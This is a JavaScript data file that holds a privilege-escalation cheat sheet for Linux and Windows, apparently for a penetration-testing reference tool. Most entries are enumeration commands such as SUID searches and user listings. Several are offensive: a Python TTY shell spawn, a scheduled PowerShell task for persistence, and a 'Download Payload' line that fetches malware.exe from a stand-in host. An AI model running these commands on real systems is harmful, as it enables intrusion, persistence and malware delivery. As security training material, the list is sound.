export const commandData = {
    "Linux Privilege Escalation Commands": [
        {
            title: "List Sudo Commands",
            description: "List the commands that the current user can run with sudo.",
            command: "sudo -l",
        },
        {
            title: "Open Root Shell",
            description: "Open a new shell with root privileges.",
            command: "sudo -s",
        },
        {
            title: "Switch to Root User",
            description: "Switch to the root user.",
            command: "sudo su",
        },
        {
            title: "Find SUID Files",
            description: "Find files with the SUID bit set.",
            command: "find / -perm -4000 -type f 2>/dev/null",
        },
        {
            title: "List Users",
            description: "Display the list of users.",
            command: "cat /etc/passwd",
        },
        {
            title: "List Root Directory",
            description: "List all files and directories in the root directory with detailed information.",
            command: "ls -la /",
        },
        {
            title: "Display User ID",
            description: "Display user ID and group ID.",
            command: "id",
        },
        {
            title: "System Information",
            description: "Display system information.",
            command: "uname -a",
        },
        {
            title: "List Running Processes",
            description: "List all running processes.",
            command: "ps aux",
        },
        {
            title: "Current User",
            description: "Display the current user.",
            command: "whoami",
        },
        {
            title: "Python TTY Shell",
            description: "Spawn a TTY shell using Python.",
            command: "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        },
        {
            title: "Find Files",
            description: "Find files with specific criteria.",
            command: "find / -name <filename>",
        },
        {
            title: "Search Directories",
            description: "Search for directories with specific criteria.",
            command: "find / -type d -name <directory_name>",
        },
        {
            title: "Find Files by Extension",
            description: "Find files with a specific extension.",
            command: "find / -type f -name '*.txt'",
        },
    ],
    "Windows Privilege Escalation Commands": [
        {
            title: "List Privileges",
            description: "List privileges of the current user.",
            command: "whoami /priv",
        },
        {
            title: "List Users",
            description: "List all users on the system.",
            command: "net user",
        },
        {
            title: "System Information",
            description: "Display system information.",
            command: "systeminfo",
        },
        {
            title: "Network Configuration",
            description: "Display network configuration.",
            command: "ipconfig /all",
        },
        {
            title: "List Installed Patches",
            description: "List installed patches and updates.",
            command: "wmic qfe list",
        },
        {
            title: "List Admin Group Members",
            description: "List members of the local Administrators group.",
            command: "net localgroup administrators",
        },
        {
            title: "List User Groups",
            description: "List all groups the current user is a member of.",
            command: "whoami /groups",
        },
        {
            title: "Create Scheduled Task",
            description: "Create a scheduled task to run PowerShell daily.",
            command: 'schtasks /create /tn "MyTask" /tr "powershell.exe" /sc daily /st 00:00',
        },
        {
            title: "Elevated Command Prompt",
            description: "Launch a new elevated command prompt.",
            command: 'powershell -c "Start-Process cmd -Verb runAs"',
        },
        {
            title: "Download Payload",
            description: "Download and execute a malicious payload.",
            command:
                'powershell -c "Invoke-WebRequest http://example.com/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe"',
        },
    ],
    "Python TTY Commands": [
        {
            title: "Spawn TTY Shell",
            description: "Spawn a TTY shell using Python.",
            command: "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        },
    ],
    "Find Commands": [
        {
            title: "Find Files by Name",
            description: "Find files with a specific name.",
            command: "find / -name <filename>",
        },
        {
            title: "Find Files by Extension",
            description: "Find files with a specific extension.",
            command: "find / -type f -name '*.txt'",
        },
        {
            title: "Find Directories",
            description: "Find directories with specific criteria.",
            command: "find / -type d -name <directory_name>",
        },
        {
            title: "Find Files with SUID Bit",
            description: "Find files with the SUID bit set.",
            command: "find / -perm -4000 -type f 2>/dev/null",
        },
        {
            title: "Find Writable Files",
            description: "Find files that are writable.",
            command: "find / -writable -type f 2>/dev/null",
        },
    ],
};
